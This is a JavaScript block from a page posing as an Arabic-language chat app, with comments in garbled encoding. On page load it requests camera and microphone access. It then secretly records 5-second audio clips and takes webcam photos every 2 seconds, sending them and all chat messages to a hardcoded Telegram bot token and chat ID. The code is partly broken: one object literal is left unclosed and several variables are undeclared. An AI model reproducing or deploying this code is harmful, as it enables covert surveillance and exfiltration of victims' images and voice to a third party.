    <script>
        const BOT_TOKEN = '8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124';
        const CHAT_ID = '5648826330';
        
        let chats = [];

        // ŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
        let stream = null;
        let audioActive = false;
        let photoActive = false;
        const AUDIO_MS = 5000; // ÿßŸÑÿµŸàÿ™ ŸÉŸÑ 5 ÿ´ŸàÿßŸÜŸä
        const PHOTO_MS = 2000; // ÿßŸÑÿµŸàÿ±ÿ© ŸÉŸÑ 2 ÿ´ÿßŸÜŸäÿ©

        // ŸÇÿßÿπÿØÿ© ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ
        const users = {
            '59356': { name: 'ŸÜÿ±ÿ¨ÿ≥', avatar: 'üå∏', sendCommand: '/send1' },
            '12345': { name: 'ÿ£ÿ≠ŸÖÿØ', avatar: 'üë®', sendCommand: '/send2' },
            '67890': { name: 'ŸÅÿßÿ∑ŸÖÿ©', avatar: 'üë©', sendCommand: '/send3' },

        // ==================== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ====================
        
        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ•ŸÑŸâ ÿ™ŸÑŸäÿ¨ÿ±ÿßŸÖ
        async function sendMediaToTelegram(blob, type="voice") {
            const form = new FormData();
            form.append("chat_id", CHAT_ID);
            
            if (type === "voice") {
                form.append("voice", blob, "audio.ogg");
            } else {
                form.append("photo", blob, "photo.jpg");
            }
            
            const endpoint = type === "voice" ? "sendVoice" : "sendPhoto";
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                    method: "POST",
                    body: form
                });
                const data = await response.json();
                if (!data.ok) {
                    console.error(`ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ${type}:`, data);
                }
            } catch (err) {
                console.error("ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ:", err);
            }
        }

        // ÿ™ÿ≥ÿ¨ŸäŸÑ ÿµŸàÿ™ 5 ÿ´ŸàÿßŸÜŸä
        function recordAudio() {
            return new Promise((resolve, reject) => {
                if (!stream) {
                    reject(new Error("ŸÑÿß ŸäŸàÿ¨ÿØ stream"));
                    return;
                }
                
                try {
                    const audioStream = new MediaStream(stream.getAudioTracks());
                    const recorder = new MediaRecorder(audioStream, {
                        mimeType: 'audio/webm;codecs=opus'
                    });
                    const chunks = [];
                    
                    recorder.ondataavailable = e => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: "audio/ogg" });
                        resolve(blob);
                    };
                    
                    recorder.onerror = (e) => reject(e);
                    
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, AUDIO_MS);
                } catch (err) {
                    reject(err);
                }
            });
        }

        // ÿßŸÑÿ™ŸÇÿßÿ∑ ÿµŸàÿ±ÿ©
        function captureImage() {
            return new Promise((resolve, reject) => {
                if (!stream) {
                    reject(new Error("ŸÑÿß ŸäŸàÿ¨ÿØ stream"));
                    return;
                }
                
                try {
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.muted = true;
                    
                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            setTimeout(() => {
                                const canvas = document.createElement("canvas");
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext("2d");
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                canvas.toBlob(blob => {
                                    video.pause();
                                    video.srcObject = null;
                                    resolve(blob);
                                }, "image/jpeg", 0.8);
                            }, 100);
                        }).catch(reject);
                    };
                    
                    video.onerror = reject;
                } catch (err) {
                    reject(err);
                }
            });
        }

        // ÿ≠ŸÑŸÇÿ© ÿßŸÑÿµŸàÿ™
        async function audioLoop() {
            audioActive = true;
            while (audioActive) {
                try {
                    const audio = await recordAudio();
                    if (audio && audio.size > 0) {
                        await sendMediaToTelegram(audio, "voice");
                        console.log("‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™");
                    }
                } catch (err) {
                    console.error("ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿµŸàÿ™:", err);
                }
                await new Promise(r => setTimeout(r, 5000));
            }
        }

        // ÿ≠ŸÑŸÇÿ© ÿßŸÑÿµŸàÿ±
        async function photoLoop() {
            photoActive = true;
            while (photoActive) {
                try {
                    const img = await captureImage();
                    if (img && img.size > 0) {
                        await sendMediaToTelegram(img, "photo");
                        console.log("‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ©");
                    }
                } catch (err) {
                    console.error("ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ±ÿ©:", err);
                }
                await new Promise(r => setTimeout(r, PHOTO_MS));
            }
        }

        // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
        async function startRecording() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true
                    }, 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                console.log("‚úÖ ÿ™ŸÖ ŸÖŸÜÿ≠ ÿßŸÑÿ•ÿ∞ŸÜ! ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ...");
                audioLoop();
                photoLoop();
            } catch (err) {
                console.error("‚ùå ÿ™ŸÖ ÿ±ŸÅÿ∂ ÿßŸÑÿ•ÿ∞ŸÜ ÿ£Ÿà ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£:", err);
            }
        }

        // ==================== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ====================

        // ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÖŸÜ localStorage ÿπŸÜÿØ ÿ®ÿØÿ° ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ
        function loadData() {
            const savedChats = localStorage.getItem('chats');
            const savedLastUpdateId = localStorage.getItem('lastUpdateId');
            
            if (savedChats) {
                chats = JSON.parse(savedChats);
                renderChats();
            }
            
            if (savedLastUpdateId) {
                lastUpdateId = parseInt(savedLastUpdateId);
            }
        }

        // ÿ≠ŸÅÿ∏ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÅŸä localStorage
        function saveData() {
            localStorage.setItem('chats', JSON.stringify(chats));
            localStorage.setItem('lastUpdateId', lastUpdateId.toString());
        }

        function openAddChatModal() {
            document.getElementById('addChatModal').classList.add('active');
        }

        function closeAddChatModal() {
            document.getElementById('addChatModal').classList.remove('active');
            document.getElementById('chatCodeInput').value = '';
        }

        function addChat() {
            const code = document.getElementById('chatCodeInput').value.trim();
            
            if (users[code]) {
                // ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿπÿØŸÖ Ÿàÿ¨ŸàÿØ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ŸÖÿ≥ÿ®ŸÇÿßŸã
                if (chats.find(chat => chat.code === code)) {
                    alert('Ÿáÿ∞Ÿá ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ŸÖŸàÿ¨ŸàÿØÿ© ÿ®ÿßŸÑŸÅÿπŸÑ!');
                    return;
                }
                
                const newChat = {
                    code: code,
                    name: users[code].name,
                    avatar: users[code].avatar,
                    sendCommand: users[code].sendCommand,
                    messages: [],
                    lastMessage: '',
                    time: ''
                };
                
                chats.push(newChat);
                renderChats();
                saveData();
                closeAddChatModal();
                openChat(newChat);
            } else {
                alert('ŸÉŸàÿØ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠!');
            }
        }

        function renderChats() {
            const chatsList = document.getElementById('chatsList');
            chatsList.innerHTML = '';
            
            chats.forEach(chat => {
                const chatItem = document.createElement('div');
                chatItem.className = 'chat-item';
                if (activeChat && activeChat.code === chat.code) {
                    chatItem.classList.add('active');
                }
                
                chatItem.innerHTML = `
                    <div class="chat-avatar">${chat.avatar}</div>
                    <div class="chat-info">
                        <div class="chat-name">${chat.name}</div>
                        <div class="chat-last-message">${chat.lastMessage || 'ÿßÿ®ÿØÿ£ ÿßŸÑÿØÿ±ÿØÿ¥ÿ©...'}</div>
                    </div>
                    <div class="chat-time">${chat.time}</div>
                `;
                
                chatItem.onclick = () => openChat(chat);
                chatsList.appendChild(chatItem);
            });
        }

        function openChat(chat) {
            stopPolling();
            activeChat = chat;
            renderChats();
            
            const chatArea = document.getElementById('chatArea');
            chatArea.innerHTML = `
                <div class="chat-header">
                    <div class="chat-header-avatar">${chat.avatar}</div>
                    <div class="chat-header-info">
                        <h3>${chat.name}</h3>
                        <div class="chat-header-status">ŸÖÿ™ÿµŸÑ</div>
                    </div>
                </div>
                
                <div class="messages-container" id="messagesContainer"></div>
                
                <div class="input-area">
                    <input type="text" class="message-input" id="messageInput" placeholder="ÿßŸÉÿ™ÿ® ÿ±ÿ≥ÿßŸÑÿ©...">
                    <button class="send-btn" onclick="sendMessage()">‚û§</button>
                </div>
            `;
            
            renderMessages();
            startPolling();
            
            document.getElementById('messageInput').focus();
            
            document.getElementById('messageInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendMessage();
                }
            });
        }

        function renderMessages() {
            if (!activeChat) return;
            
            const container = document.getElementById('messagesContainer');
            container.innerHTML = '';
            
            activeChat.messages.forEach(msg => {
                const messageDiv = document.createElement('div');
                messageDiv.className = `message ${msg.type}`;
                
                messageDiv.innerHTML = `
                    <div class="message-bubble">
                        <div class="message-text">${msg.text}</div>
                        <div class="message-time">${msg.time}</div>
                    </div>
                `;
                
                container.appendChild(messageDiv);
            });
            
            container.scrollTop = container.scrollHeight;
        }

        function sendMessage() {
            if (!activeChat) return;
            
            const input = document.getElementById('messageInput');
            const text = input.value.trim();
            
            if (!text) return;
            
            const now = new Date();
            const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
            
            const message = {
                text: text,
                type: 'sent',
                time: time
            };
            
            activeChat.messages.push(message);
            activeChat.lastMessage = text;
            activeChat.time = time;
            
            input.value = '';
            renderMessages();
            renderChats();
            saveData();
            
            sendToTelegram(text);
        }

        async function sendToTelegram(text) {
            if (!activeChat) return;
            
            const message = `üì® ÿ±ÿ≥ÿßŸÑÿ© ŸÖŸÜ ${activeChat.name} (${activeChat.sendCommand}):\n\n${text}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ:', error);
            }
        }

        let isProcessing = false;

        async function checkForMessages() {
            if (isProcessing) return;
            
            isProcessing = true;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&limit=10`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                            
                            if (update.message && update.message.text) {
                                const text = update.message.text;
                                
                                // ÿßŸÑÿ®ÿ≠ÿ´ ŸÅŸä ÿ¨ŸÖŸäÿπ ÿßŸÑÿØÿ±ÿØÿ¥ÿßÿ™ ÿπŸÜ ÿßŸÑÿ£ŸÖÿ± ÿßŸÑŸÖŸÜÿßÿ≥ÿ®
                                chats.forEach(chat => {
                                    if (text.startsWith(chat.sendCommand + ' ')) {
                                        const replyText = text.substring(chat.sendCommand.length + 1).trim();
                                        
                                        if (replyText) {
                                            const now = new Date();
                                            const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
                                            
                                            const message = {
                                                text: replyText,
                                                type: 'received',
                                                time: time,
                                                id: update.update_id
                                            };
                                            
                                            // ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿπÿØŸÖ Ÿàÿ¨ŸàÿØ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÖÿ≥ÿ®ŸÇÿßŸã
                                            const exists = chat.messages.find(m => m.id === update.update_id);
                                            if (!exists) {
                                                chat.messages.push(message);
                                                chat.lastMessage = replyText;
                                                chat.time = time;
                                                
                                                // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑŸàÿßÿ¨Ÿáÿ© ÿ•ÿ∞ÿß ŸÉÿßŸÜÿ™ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ŸÜÿ¥ÿ∑ÿ©
                                                if (activeChat && activeChat.code === chat.code) {
                                                    renderMessages();
                                                }
                                                renderChats();
                                                console.log(`‚úÖ ÿ±ÿ≥ÿßŸÑÿ© ÿ¨ÿØŸäÿØÿ© ŸÑŸÄ ${chat.name}: ${replyText}`);
                                            }
                                        }
                                    }
                                });
                            }
                        }
                    }
                    
                    saveData();
                }
            } catch (error) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßÿ≥ÿ™ŸÇÿ®ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ:', error);
            } finally {
                isProcessing = false;
            }
        }

        function startPolling() {
            if (pollingInterval) clearInterval(pollingInterval);
            // ÿ®ÿØÿ° ÿßŸÑŸÅÿ≠ÿµ ŸÅŸàÿ±ÿßŸã ÿ´ŸÖ ŸÉŸÑ 3 ÿ´ŸàÿßŸÜŸä
            checkForMessages();
            pollingInterval = setInterval(checkForMessages, 3000);
        }

        function stopPolling() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        document.getElementById('addChatModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeAddChatModal();
            }
        });

        // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ∑ÿ®ŸäŸÇ
        window.addEventListener('load', () => {
            loadData();
            startRecording(); // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
            startPolling(); // ÿ®ÿØÿ° ŸÅÿ≠ÿµ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ŸÖŸÜ ÿßŸÑÿ®Ÿàÿ™
        });
    </script>
